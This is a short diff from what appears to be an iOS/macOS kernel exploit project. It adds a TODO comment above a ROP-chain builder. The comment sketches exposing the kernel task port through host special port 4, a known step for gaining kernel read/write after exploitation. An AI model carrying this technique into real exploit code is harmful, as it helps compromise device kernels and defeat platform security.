@@ -197,6 +197,8 @@ do \
     addr += s; \
 } while(0)
 
+// TODO: ipc_kobject_set(realhost.special[4]=ipc_port_alloc_special(ipc_space_kernel),IOMemoryDescriptor::withAddress(kernel_task,sizeof(task_t),kIODirectionInOut)->map(0)->getVirtualAddress(),IKOT_TASK);
+
 void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
 {
     LOG("Building ROP chain...");
